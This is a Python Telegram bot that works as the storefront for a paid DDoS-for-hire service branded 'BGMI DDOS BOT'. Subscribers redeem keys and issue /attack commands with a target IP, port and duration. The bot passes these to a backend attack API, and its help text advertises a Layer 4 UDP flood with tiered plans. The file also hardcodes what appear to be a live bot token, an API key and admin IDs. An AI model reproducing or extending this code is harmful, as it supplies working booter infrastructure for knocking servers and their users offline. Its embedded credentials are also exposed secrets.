#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import os
import hashlib
import random
import string
import threading
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler

# ============================================
# CONFIG - APNA URL, TOKEN, API KEY DAALO
# ============================================
BOT_TOKEN = "8941070109:AAEHz4IuI2Cc1sDoIffV2vJ6bwPLctl21wE"

# 🔥 URL CHANGE KARO (Local ya Render)
API_URL = "http://localhost:5001"  # Local
# API_URL = "https://warriors-ddos-sever.onrender.com"  # Render

API_KEY = "e948ceb29867e38320e4c05a80206176eea84093a8ae0b0ef4657b78430670da"

# ============================================
# ADMIN IDs
# ============================================
ADMIN_IDS = [7983241359, 6548871396]  # Admin IDs

# ============================================
# DATABASE
# ============================================
USERS_DB = "users_db.json"

def load_db():
    try:
        with open(USERS_DB, 'r') as f:
            return json.load(f)
    except:
        return {"users": {}, "admins": ADMIN_IDS, "keys": {}}

def save_db(data):
    with open(USERS_DB, 'w') as f:
        json.dump(data, f, indent=4)

db = load_db()

# ============================================
# HELPER FUNCTIONS
# ============================================
def is_admin(user_id):
    return user_id in ADMIN_IDS or user_id in db.get('admins', [])

def is_user_valid(user_id):
    user_id_str = str(user_id)
    if is_admin(user_id):
        return True, ""
    if user_id_str not in db['users']:
        return False, "❌ No active subscription! Use /redeem KEY"
    if time.time() >= db['users'][user_id_str]['expiry']:
        return False, "❌ Subscription expired! Use /redeem KEY"
    return True, ""

def get_user_expiry(user_id):
    user_id_str = str(user_id)
    if user_id_str in db['users']:
        remaining = db['users'][user_id_str]['expiry'] - time.time()
        if remaining <= 0:
            return "Expired"
        days = int(remaining // 86400)
        hours = int((remaining % 86400) // 3600)
        if days > 0:
            return f"{days}d {hours}h"
        return f"{hours}h"
    return None

# ============================================
# API FUNCTIONS
# ============================================
def api_start_attack(target, port, duration):
    try:
        response = requests.post(
            f"{API_URL}/attack",
            json={"target": target, "port": port, "duration": duration, "key": API_KEY},
            timeout=10
        )
        return response.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

def api_stop_attack(attack_id):
    try:
        response = requests.post(
            f"{API_URL}/attack/stop",
            json={"attack_id": attack_id, "key": API_KEY},
            timeout=10
        )
        return response.json()
    except:
        return {"success": False, "error": "Failed"}

def api_get_status():
    try:
        response = requests.get(f"{API_URL}/status", timeout=5)
        return response.json()
    except:
        return {"status": "offline"}

def api_get_slots():
    try:
        response = requests.get(f"{API_URL}/slots", timeout=5)
        return response.json()
    except:
        return {"error": "Failed"}

def api_get_health():
    try:
        response = requests.get(f"{API_URL}/health", timeout=3)
        return response.json()
    except:
        return {"status": "offline"}

# ============================================
# KEY FUNCTIONS
# ============================================
def generate_key(days=30, key_type="basic"):
    prefix = "VIP" if key_type == "premium" else "TRX"
    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    db = load_db()
    if 'keys' not in db:
        db['keys'] = {}
    db['keys'][key] = {
        "days": days,
        "used": False,
        "used_by": None,
        "created": time.time(),
        "type": key_type
    }
    save_db(db)
    return key

def redeem_key(user_id, key):
    user_id_str = str(user_id)
    db = load_db()
    
    if key not in db.get('keys', {}):
        return False, "❌ Invalid key!"
    
    if db['keys'][key]['used']:
        return False, "❌ Key already used!"
    
    days = db['keys'][key]['days']
    key_type = db['keys'][key].get('type', 'basic')
    db['keys'][key]['used'] = True
    db['keys'][key]['used_by'] = user_id_str
    
    expiry = time.time() + (days * 86400)
    if 'users' not in db:
        db['users'] = {}
    db['users'][user_id_str] = {
        "expiry": expiry,
        "redeemed_key": key,
        "type": key_type
    }
    
    save_db(db)
    
    expiry_date = datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M:%S")
    
    if key_type == 'premium':
        return True, f"""
✅ KEY REDEEMED SUCCESSFULLY!
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: PREMIUM 💎
📅 Expiry: {expiry_date}
━━━━━━━━━━━━━━━━━━━━━━━━"""
    else:
        return True, f"""
✅ KEY REDEEMED SUCCESSFULLY!
━━━━━━━━━━━━━━━━━━━━━━━━
📀 Plan: BASIC ⚡
📅 Expiry: {expiry_date}
━━━━━━━━━━━━━━━━━━━━━━━━"""

# ============================================
# BOT COMMANDS
# ============================================

async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if is_admin(user_id):
        await update.message.reply_text("""
👑 **ADMIN PANEL**

📌 **Commands:**
/attack `<ip> <port> <time>` - Start attack
/stop `<attack_id>` - Stop attack
/status - Check status
/slots - Check slots
/help - Help
/redeem `<key>` - Redeem key
/genkey `<days>` `<type>` - Generate key
/keys - List all keys
/delkey `<key>` - Delete key
/adduser `<id>` `<days>` - Add user
/removeuser `<id>` - Remove user
/allusers - List all users

⚡ **BGMI DDOS BOT**
""", parse_mode="Markdown")
    else:
        valid, err = is_user_valid(user_id)
        if not valid:
            await update.message.reply_text(err)
            return
        
        expiry = get_user_expiry(user_id)
        await update.message.reply_text(f"""
⚡ **BGMI DDOS USER**

✅ Approved
📅 Expires: {expiry}

📌 **Commands:**
/attack `<ip> <port> <time>` - Start attack
/stop `<attack_id>` - Stop attack
/status - Check status
/slots - Check slots
/help - Help
/redeem `<key>` - Redeem key
""", parse_mode="Markdown")

async def attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    valid, err = is_user_valid(user_id)
    if not valid:
        await update.message.reply_text(err)
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ **Usage:** `/attack <ip> <port> <time>`\n"
            "Example: `/attack 8.8.8.8 80 60`",
            parse_mode="Markdown"
        )
        return
    
    target = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except:
        await update.message.reply_text("❌ Invalid port or time!")
        return
    
    if duration > 600:
        await update.message.reply_text("❌ Max time is 600s!")
        return
    if duration < 5:
        await update.message.reply_text("❌ Min time is 5s!")
        return
    
    status = api_get_health()
    if status.get('status') != 'healthy':
        await update.message.reply_text("❌ API is offline!")
        return
    
    await update.message.reply_text(
        f"🔥 **Starting attack on `{target}:{port}`**\n"
        f"⏱️ Duration: {duration}s",
        parse_mode="Markdown"
    )
    
    result = api_start_attack(target, port, duration)
    
    if result.get('success'):
        attack_id = result.get('attack_id')
        
        keyboard = [[InlineKeyboardButton("⏹️ Stop Attack", callback_data=f"stop_{attack_id}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ **Attack Started!**\n\n"
            f"📌 ID: `{attack_id}`\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Time: {duration}s\n"
            f"📊 Slots: {result.get('slots_used', 0)}/{result.get('slots_total', 14)}",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
    else:
        error = result.get('error', 'Unknown error')
        if "slots are busy" in error:
            await update.message.reply_text(
                f"❌ **All slots are busy!**\n\n"
                f"📊 Slots Used: {result.get('slots_used', 0)}/{result.get('slots_total', 14)}\n"
                f"⏳ Please wait."
            )
        else:
            await update.message.reply_text(f"❌ **Error:** {error}")

async def stop(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    valid, err = is_user_valid(user_id)
    if not valid:
        await update.message.reply_text(err)
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            "❌ **Usage:** `/stop <attack_id>`\n"
            "Example: `/stop attack_1234567890`",
            parse_mode="Markdown"
        )
        return
    
    attack_id = args[0]
    await update.message.reply_text(f"⏹️ Stopping attack: `{attack_id}`", parse_mode="Markdown")
    
    result = api_stop_attack(attack_id)
    
    if result.get('success'):
        await update.message.reply_text(
            f"✅ **Attack Stopped!**\n\n"
            f"📌 ID: `{attack_id}`\n"
            f"📊 Slots Available: {result.get('slots_available', 0)}/{result.get('slots_total', 14)}",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(f"❌ Failed to stop attack!\n\nError: {result.get('error', 'Unknown')}")

async def status(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    valid, err = is_user_valid(user_id)
    if not valid:
        await update.message.reply_text(err)
        return
    
    status = api_get_status()
    if status.get('status') == 'online':
        active_attacks = status.get('attacks', [])
        msg = f"✅ **API Status: Online**\n\n"
        msg += f"📊 Active Attacks: {status.get('active_attacks', 0)}\n"
        msg += f"📊 Slots: {status.get('slots_used', 0)}/{status.get('max_slots', 14)}\n"
        msg += f"📊 Available: {status.get('slots_available', 0)}\n\n"
        
        if active_attacks:
            msg += "⚔️ **Active Attacks:**\n"
            for a in active_attacks:
                msg += f"  🎯 {a['target']}:{a['port']} - {a['remaining']}s remaining ({a['percent']}%)\n"
        else:
            msg += "⚡ No active attacks"
        
        await update.message.reply_text(msg, parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ API is offline!")

async def slots(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    valid, err = is_user_valid(user_id)
    if not valid:
        await update.message.reply_text(err)
        return
    
    slots = api_get_slots()
    if 'error' not in slots:
        msg = f"🎯 **Slots Status**\n\n"
        msg += f"📊 Total: {slots.get('total', 14)}\n"
        msg += f"📊 Used: {slots.get('used', 0)}\n"
        msg += f"📊 Available: {slots.get('available', 0)}\n\n"
        
        active = slots.get('active_attacks', [])
        if active:
            msg += "⚔️ **Active Attacks:**\n"
            for a in active:
                msg += f"  🎯 {a['target']}:{a['port']} - {a['remaining']}s remaining\n"
        else:
            msg += "⚡ No active attacks"
        
        await update.message.reply_text(msg, parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ Error: {slots.get('error')}")

async def redeem(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("❌ Usage: `/redeem <key>`", parse_mode="Markdown")
        return
    
    key = args[0].upper()
    success, msg = redeem_key(user_id, key)
    await update.message.reply_text(msg)

async def help(update: Update, context: CallbackContext):
    await update.message.reply_text("""
💀 **BGMI DDOS BOT - Help**

📌 **Commands:**
`/attack 8.8.8.8 80 60` - Start attack
`/stop attack_123` - Stop attack
`/status` - Check status
`/slots` - Check slots
`/redeem KEY` - Redeem key
`/help` - Help

⚡ **Power:**
- Layer 4 UDP Flood
- 25 Threads per Attack
- 5s Burst Interval
- Auto Slot Release

🔑 **Plans:**
📀 Basic - 6 Concurrent, 300s
🌟 Premium - 12 Concurrent, 600s
""", parse_mode="Markdown")

async def genkey(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ Usage: `/genkey <days> <type>`\n"
            "Example: `/genkey 30 basic`\n"
            "Types: basic, premium",
            parse_mode="Markdown"
        )
        return
    
    try:
        days = int(args[0])
        key_type = args[1].lower()
        if key_type not in ['basic', 'premium']:
            await update.message.reply_text("❌ Type must be 'basic' or 'premium'")
            return
        key = generate_key(days, key_type)
        await update.message.reply_text(
            f"✅ **Key Generated!**\n\n"
            f"🔑 `{key}`\n"
            f"📅 Valid: {days} days\n"
            f"⭐ Type: {key_type.upper()}",
            parse_mode="Markdown"
        )
    except:
        await update.message.reply_text("❌ Invalid days!")

async def keys(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    db = load_db()
    keys_data = db.get('keys', {})
    if not keys_data:
        await update.message.reply_text("📋 No keys available!")
        return
    
    msg = "📋 **ALL KEYS**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for k, v in keys_data.items():
        status = "✅ UNUSED" if not v['used'] else f"❌ USED by {v['used_by']}"
        msg += f"🔑 `{k}` | {v['days']}d | {status}\n"
    
    await update.message.reply_text(msg[:4000], parse_mode="Markdown")

async def delkey(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❌ Usage: `/delkey <key>`", parse_mode="Markdown")
        return
    
    key = args[0].upper()
    db = load_db()
    if key in db.get('keys', {}):
        del db['keys'][key]
        save_db(db)
        await update.message.reply_text(f"✅ Key `{key}` deleted!", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Key not found!")

async def adduser(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ Usage: `/adduser <id> <days>`\n"
            "Example: `/adduser 123456789 30`",
            parse_mode="Markdown"
        )
        return
    
    try:
        uid = int(args[0])
        days = int(args[1])
        db = load_db()
        if 'users' not in db:
            db['users'] = {}
        db['users'][str(uid)] = {
            "expiry": time.time() + (days * 86400),
            "added_by": str(user_id),
            "added_at": time.time()
        }
        save_db(db)
        await update.message.reply_text(f"✅ User `{uid}` added for {days} days!", parse_mode="Markdown")
    except:
        await update.message.reply_text("❌ Invalid ID or days!")

async def removeuser(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❌ Usage: `/removeuser <id>`", parse_mode="Markdown")
        return
    
    try:
        uid = args[0]
        db = load_db()
        if str(uid) in db.get('users', {}):
            del db['users'][str(uid)]
            save_db(db)
            await update.message.reply_text(f"✅ User `{uid}` removed!", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ User not found!")
    except:
        await update.message.reply_text("❌ Invalid ID!")

async def allusers(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    db = load_db()
    users_data = db.get('users', {})
    if not users_data:
        await update.message.reply_text("📋 No users found!")
        return
    
    msg = "📋 **ALL USERS**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in users_data.items():
        expiry = datetime.fromtimestamp(data['expiry']).strftime('%Y-%m-%d %H:%M')
        msg += f"🆔 `{uid}` | 📅 {expiry}\n"
    
    await update.message.reply_text(msg[:4000], parse_mode="Markdown")

async def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("stop_"):
        attack_id = query.data.replace("stop_", "")
        result = api_stop_attack(attack_id)
        if result.get('success'):
            await query.edit_message_text(f"✅ Attack stopped: `{attack_id}`", parse_mode="Markdown")
        else:
            await query.edit_message_text("❌ Failed to stop attack!")

# ============================================
# MAIN
# ============================================
def main():
    print("="*60)
    print("💀 BGMI DDOS BOT")
    print("="*60)
    print(f"📡 API URL: {API_URL}")
    print(f"🔑 API Key: {API_KEY[:30]}...")
    print(f"👑 Admins: {ADMIN_IDS}")
    
    # Check API
    try:
        response = requests.get(f"{API_URL}/health", timeout=3)
        if response.status_code == 200:
            print("✅ API is online!")
        else:
            print("❌ API is offline!")
    except:
        print("❌ API is offline! Start API first.")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("slots", slots))
    application.add_handler(CommandHandler("redeem", redeem))
    
    # Admin commands
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("keys", keys))
    application.add_handler(CommandHandler("delkey", delkey))
    application.add_handler(CommandHandler("adduser", adduser))
    application.add_handler(CommandHandler("removeuser", removeuser))
    application.add_handler(CommandHandler("allusers", allusers))
    
    # Callback
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("✅ Bot is running...")
    print("="*60)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Bot stopped")
    except Exception as e:
        print(f"❌ Error: {e}")